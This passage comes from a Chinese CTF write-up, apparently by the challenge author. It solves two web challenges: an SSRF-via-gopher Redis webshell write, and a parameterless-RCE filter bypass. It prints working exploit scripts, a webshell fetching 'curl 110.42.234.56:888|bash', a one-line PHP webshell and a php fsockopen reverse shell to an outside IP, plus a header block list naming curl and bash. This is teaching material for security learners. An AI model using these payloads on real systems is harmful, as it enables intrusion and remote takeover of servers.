class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">    req = requests.get(url, params)</span><br><span class="line"></span><br><span class="line">    fantan = <span class="built_in">input</span>(<span class="string">&#x27;已经写入webshell,是否准备反弹shell?输入yes或no：&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> fantan == <span class="string">&#x27;yes&#x27;</span>:</span><br><span class="line">        params = &#123;<span class="string">&#x27;word&#x27;</span>:<span class="string">&#x27;http://172.26.0.2/shell.php&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        req1 = requests.get(url,params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>脚本写的有点乱，所以我解释一下。这个脚本大概分为了三部分，一部分是找到redis的密码，一部分是结合密码利用redis存入我们构造好的webshell至主机中，还有一部分是执行构造好的webshell，反弹shell到我们的服务器上。</p>
<p>要理解这个脚本，首先我们要先知道我们需要redis执行哪些命令。直接看脚本是怎么写的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth xxxx</span><br><span class="line">flushall</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>首先通过这些命令然后将i从0至9999遍历一遍，爆破出redis的认证密码，可以得到密码为9547。（题目也在靶场给出hint，密码长度&lt;5且均由数字构成。）</p>
<p>当我们得到密码后就可以让redis执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auth 9547</span><br><span class="line">flushall</span><br><span class="line">set snert webshell</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>这里解释一下这些命令。首先是auth命令，命令用于检测给定的密码和配置文件中的密码是否相符，也就是验证我们的密码是否正确。然后是flushall：清空整个 Redis 服务器的数据(删除所有数据库的所有 key )。接着添加名为snert的key，值为我们所定义的webshell，也就是<code>\n\n\n\n&lt;?=system(\&quot;curl 110.42.234.56:888|bash\&quot;);?&gt;\n\n\n\n</code>（这里需要注意一下，因为在我们拿到的源码中我们可以得知，系统是ban掉了<code>?php</code>字符串的，所以使用短标签绕过。并且我们无法通过常规查看flag的手段来getflag，因为当你<code>cat /flag</code>之后你就会发现，这该死的出题人也就是我，把真正的flag写在了一个隐藏文件中。因此我们需要拿到服务器的shell）。接着设置备份路径为&#x2F;var&#x2F;www&#x2F;html，然后设置备份文件名为shell.php，开始备份，最后退出。</p>
<p>其中redis_format函数将上面这些命令更改为Redis的数据发送的数据包格式（具体实现可以看代码），也就是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://172.26.0.2:6379/a*2</span><br><span class="line">$4</span><br><span class="line">auth</span><br><span class="line">$4</span><br><span class="line">9547</span><br><span class="line"></span><br><span class="line">*1</span><br><span class="line">$8</span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$5</span><br><span class="line">snert</span><br><span class="line">$51</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?=system(&quot;curl 110.42.234.56:888|bash&quot;);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$13</span><br><span class="line">/var/www/html</span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$9</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">quit</span><br><span class="line"></span><br><span class="line">//注意quit后面还有一个换行哦</span><br></pre></td></tr></table></figure>

<p>这里的curl只是对应index.php中的<code>curl_exec</code> 函数，为了理解得更直观才这样写的。gopher及后面的数据才是我们需要传入的。（这点应该是不需要说的，自己看源码就可以知道。）接着将使用main函数其转化为url编码，在构造payload的时候应该注意，TCP数据流前不能再用<code>_</code>这个字符了，因为被代码过滤了，但是这个字符并不是必须，我们可以利用任何一个字符代替它（详情请看这篇文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究</a>）。接着利用requests模块传入数据：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626687db50948.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687db50948.png"></a></p>
<p>接着是第三部分，在执行之前脚本会询问你是否需要反弹shell，你在输入yes之前，应该确保自己已经监听起了相应服务器的相应端口。接着脚本会继续传参，其中word参数的值为<code>http://172.26.0.2/shell.php</code>，这样的话我们就成功在<code>172.26.0.3</code> 也就是我们的靶机 上的index.php包含进来了一个<code>172.26.0.2</code>机器上的shell.php文件，接着shell.php就会被执行。</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626687ed9706b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687ed9706b.png"></a></p>
<p>这里再次提醒一下，如果你不拿到shell直接利用cat &#x2F;flag的话是看不到真正的flag的，你需要找到那个隐藏的文件&#x2F;.true_flag才可以拿到flag。另外，要注意的是，我们反弹的shell拿到的是root权限，具体原因比较复杂，在这里不作解释。你可以利用这个权限来完成破坏靶机等操作。（比赛未允许的情况的下还是不要做）</p>
<h3 id="利用工具Gopherus得到payload"><a href="#利用工具Gopherus得到payload" class="headerlink" title="利用工具Gopherus得到payload"></a>利用工具Gopherus得到payload</h3><p><strong>注意</strong>，在使用一些工具的同时，我们也应当了解解决问题的原理。不要无脑使用网上已经写好的工具，避免成为<strong>“Script Kid”</strong>。</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6266882b239250f7c593652b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6266882b239250f7c593652b.png"></a></p>
<p>Gopherus项目地址:<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
<p>这个工具无法添加redis的auth命令，因此通过该工具得到的payload在本题中无法直接使用。但是我们可以按照redis数据包的格式和gopher协议的格式自行添加auth命令，同时不要忘记更改<code>_</code>为其他任何字符。</p>
<h2 id="主人的命令"><a href="#主人的命令" class="headerlink" title="主人的命令"></a>主人的命令</h2><h3 id="获取线索-1"><a href="#获取线索-1" class="headerlink" title="获取线索"></a>获取线索</h3><p>打开环境，可以看到一个和蔼的头像，但是这不重要。查看网页源码，发现一个hint：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626688a3239250f7c5946bfa.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688a3239250f7c5946bfa.png"></a></p>
<p>vim是目前运用得最多的Linux编辑器，当用户在编辑文件但意外退出时（如通过SSH连接到服务器时，在用vim编辑文件的过程中可能遇到因为网速不够导致的命令行卡死而意外退出的情况），会在当前目录下生成一个备份文件，文件名格式为：<code>.文件名.swp</code></p>
<p>先尝试爆破一下目录：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626688b1239250f7c5948fdc.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688b1239250f7c5948fdc.png"></a></p>
<p>发现index.php，输入.index.php.swp即可得到备份文件。针对SWP备份文件，我们可以用“vim-r”命令恢复文件的内容：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626688be239250f7c594acee.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688be239250f7c594acee.png"></a></p>
<p>接着按下esc，输入<code>:wq</code> 即可将其保存为index.php（简单的vim使用命令，如果这些还不熟悉的话，可以先去学习linux的基础命令）。得到网站源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mingling&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;不对劲！\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">    <span class="variable">$snert</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mingling&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$snert</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|`|&quot;|\ |\.|,|\+|=|-|\\|\/|&gt;|&lt;|\?|\^|\$|\||&amp;|[A-Za-z0-9]/ixm&#x27;</span>,<span class="variable">$snert</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;干啥？小hacker\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$snert</span>))&#123;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="title function_ invoke__">getallheaders</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$headers</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/as|\||per|openssl|curl|rm |et|bash|post|ls|flag/&#x27;</span>,<span class="variable">$var</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;你能理解我想要过滤什么吗？如果你可以理解的话，那么你应该发现我已经无脑过滤了一切，不是吗？\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$snert</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现这里将$_SESSION[‘snert’]的值设为一个随机数的md5值的前六位。</p>
<p>接着需要传入两个POST型参数，一个名为mingling，一个名为snert。接着看这段代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;不对劲！\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对传入的参数snert的md5值的前六位进行判断，如果不等于$_SESSION[‘snert’]，就会退出程序，并弹窗提示“不对劲”。这里是一个很常见的md5截断绕过。</p>
<p>接着审计，发现这里又对我们上传的mingling参数进行了一些判断：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$snert</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|`|&quot;|\ |\.|,|\+|=|-|\\|\/|&gt;|&lt;|\?|\^|\$|\||&amp;|[A-Za-z0-9]/ixm&#x27;</span>,<span class="variable">$snert</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;干啥？小hacker\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$snert</span>))&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$snert</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>mingling</code>的长度大于70或匹配到了一些可疑字符就会退出程序并弹窗提示“干啥，小hacker”，这里对输入的mingling参数进行了大量的过滤。接着else if中要求mingling能够匹配<code>/[^\s\(\)]+?\((?R)?\)/</code>这个正则表达式，且还能多出一个分号。最后将mingling参数放入eval函数中执行。</p>
<p>首先我们看下这个正则表达式：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626688cf239250f7c594d5bf.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688cf239250f7c594d5bf.png"></a></p>
<p>发现它要求我们输入的内容必须为如下格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a()</span><br><span class="line">a(b())</span><br><span class="line">a(b(c()))</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>可以发现这是很典型的无参数RCE（<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">无参数RCE介绍</a>）</p>
<h3 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$snert</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|`|&quot;|\ |\.|,|\+|=|-|\\|\/|&gt;|&lt;|\?|\^|\$|\||&amp;|[A-Za-z0-9]/ixm&#x27;</span>,<span class="variable">$snert</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;干啥？小hacker\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里过滤了大量的字符，但是可以直接通过取反进行绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>])&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;不对劲！\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对输入的snert参数的值进行了检测，直接暴力遍历1-99999999之间的数字，然后找到md5加密后的字符串的前六位与题目所给的六位字符串相同的那个数字即可。</p>
<p>直接给出EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://web.snert.cn:8003/&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;6d566721c135ead420877d4b266b2cdb&#x27;</span>&#125;<span class="comment">#需要设置cookie，否则$_SESSION[&#x27;snert&#x27;]的值随着我们每次get都会改变</span></span><br><span class="line">data = &#123;<span class="string">&#x27;mingling&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;snert&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">req = requests.get(url,cookies=cookies)</span><br><span class="line">ret = re.findall(<span class="string">&#x27;==[a-z0-9]&#123;6&#125;&#x27;</span>,req.text)<span class="comment">#找到形如==f2aeb0的字符串</span></span><br><span class="line"><span class="keyword">match</span> = ret[<span class="number">0</span>][<span class="number">2</span>:<span class="number">8</span>]<span class="comment">#截取==f2aeb0的后六位字符，即f2aeb0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()<span class="comment">#返回md5(s)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_snert</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99999999</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>]  == <span class="built_in">str</span>(s):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i)       <span class="comment">#暴力遍历，直到找到符合的i</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:].upper()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mingling</span>():</span><br><span class="line">    <span class="comment"># a = &#x27;var_dump(getallheaders());&#x27; #可以先利用这种方法找到我们可以利用的headers</span></span><br><span class="line">    a = <span class="string">&#x27;system(end(getallheaders()));&#x27;</span></span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data[<span class="string">&#x27;mingling&#x27;</span>] = get_mingling()</span><br><span class="line">    data[<span class="string">&#x27;snert&#x27;</span>] = get_snert(<span class="keyword">match</span>)</span><br><span class="line">    <span class="comment"># headers = &#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;,&#x27;Upgrade-Insecure-Requests&#x27;:&#x27;php -r \&#x27;$sock=fsockopen(&quot;110.42.234.56&quot;,9200);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># req = requests.post(url,data,)</span></span><br><span class="line">    payload = <span class="string">&#x27;mingling=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(data[<span class="string">&#x27;mingling&#x27;</span>])+<span class="string">&#x27;&amp;&#x27;</span>+<span class="string">&#x27;snert=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(data[<span class="string">&#x27;snert&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>首先我们可以利用<code>var_dump(getallheaders())</code>来查看可以利用的headers有哪些：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626688de239250f7c594fb28.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688de239250f7c594fb28.png"></a></p>
<p>我们发现<code>current(getallheaders())</code>是Host，这个不能修改，<code>next(getallheaders())</code>是user-agent可以修改，<code>end(getallheaders())</code>是Upgrade-Insecure-Requests，也可以修改。这里以<code>Upgrade-Insecure-Requests</code>为例，先拿到我们需要post的参数，也就是利用脚本拿到<code>system(end(getallheaders()));</code>的取反，然后修改<code>Upgrade-Insecure-Requests</code>为我们想要执行的命令。这样就将<code>Upgrade-Insecure-Requests</code>作为了命令执行函数system的参数。可是这里对headers也进行了过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach ($headers as $var)&#123;</span><br><span class="line">            if (preg_match(&#x27;/as|\||per|openssl|curl|rm |et|bash|post|ls|flag/&#x27;,$var)) &#123;</span><br><span class="line">                die(&#x27;&lt;script&gt;alert(\&#x27;你能理解我想要过滤什么吗？如果你可以理解的话，那么你应该发现我已经无脑过滤了一切，不是吗？\&#x27;);history.back()&lt;/script&gt;&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这里过滤的已经很明显了，是为了防止我们反弹shell，但是这里给放开了php，也就是说我们可以利用php一句话反弹shell。但是其实不需要反弹shell，直接写入webshell也可以。</p>
<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>首先利用脚本生成我们想要上传的payload：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626688ed239250f7c595205b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688ed239250f7c595205b.png"></a></p>
<p>接着我们更改<code>Upgrade-Insecure-Requests</code>为如下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> shell.php &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[shell]);?&gt;&#x27;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>这个命令的大致内容：首先创建一个shell.php，然后将一句话木马写入shell.php中。发包之后，进入shell.php的页面：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626688f9239250f7c59539cb.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688f9239250f7c59539cb.png"></a></p>
<p>传入POST参数<code>shell=phpinfo();</code>成功返回phpinfo！接下来蚁剑连接即可在根目录处找到flag。</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>从过滤中我们可以得知出题人是想要避免我们反弹shell的，但是放开了php，因此我们可以利用php一句话反弹shell的代码来getshell：</p>
<p>php一句话反弹shell：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;110.42.234.56&quot;,9200);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

